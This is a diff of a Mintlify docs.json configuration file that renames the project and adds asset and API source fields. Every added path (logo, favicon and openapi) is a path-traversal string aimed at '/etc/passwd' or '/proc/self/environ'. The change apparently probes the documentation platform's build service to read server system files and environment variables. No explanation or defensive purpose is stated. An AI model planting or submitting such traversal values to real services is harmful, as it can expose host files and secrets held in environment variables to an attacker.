@@ -1,18 +1,27 @@
 {
-  "$schema": "https://mintlify.com/docs.json",
-  "name": "Probe782",
-  "theme": "mint",
-  "colors": {
-    "primary": "#000000"
-  },
-  "navigation": {
-    "groups": [
-      {
-        "group": "Home",
-        "pages": [
-          "index"
-        ]
-      }
+ "$schema": "https://mintlify.com/docs.json",
+ "name": "Probe797ref2",
+ "theme": "mint",
+ "colors": {
+  "primary": "#000000"
+ },
+ "logo": {
+  "light": "../../../../etc/passwd",
+  "dark": "../../../../../../../../etc/passwd"
+ },
+ "favicon": "../../../../proc/self/environ",
+ "navigation": {
+  "groups": [
+   {
+    "group": "Home",
+    "pages": [
+     "index"
     ]
-  }
+   },
+   {
+    "group": "API",
+    "openapi": "../../../../etc/passwd"
+   }
+  ]
+ }
 }
